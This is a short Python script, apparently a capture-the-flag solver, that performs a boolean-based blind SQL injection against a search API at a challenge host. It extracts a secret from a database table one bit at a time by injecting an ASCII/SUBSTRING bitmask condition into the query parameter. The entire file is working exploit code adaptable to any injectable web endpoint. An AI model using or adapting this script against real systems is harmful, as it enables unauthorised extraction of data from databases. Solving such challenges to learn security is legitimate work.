#!/usr/bin/env python3

import requests
import re
import sys

url = "https://musix.dctf.si/"
if len(sys.argv) == 2:
    url = sys.argv[1]
import urllib.parse
url = urllib.parse.urlparse(url)
url = f"{url.scheme}://{url.netloc}/"

path = "api/search"

with requests.Session() as s:

    s.get(url)

    def get_bit(char_idx:int, bit_num:int):
        bitmask = 1 << bit_num
        payload = f"""
            ' '
                OR 
                (
                    SELECT (
                        ASCII(
                            SUBSTRING(
                                (SELECT flag FROM flags LIMIT 1),
                                {char_idx+1},
                                1
                            )
                        ) & {bitmask}
                    ) = {bitmask}
                )
                OR ''='
            """.strip()
        payload = re.sub(r"\s+", " ", payload)
        r = s.get(url + path, params={"q": payload})
        return len(r.json()) != 0

    c = None
    flag = ""
    while c != '}' and len(flag) < 100:
        character = ""
        # Start at 7, if it's ascii 0-127,
        #   we can start at 6
        for i in range(6, -1, -1):
            if get_bit(len(flag), i):
                character += "1"
            else:
                character += "0"
        print(character)
        c = chr(int(character, 2))
        flag += c
        print(flag)
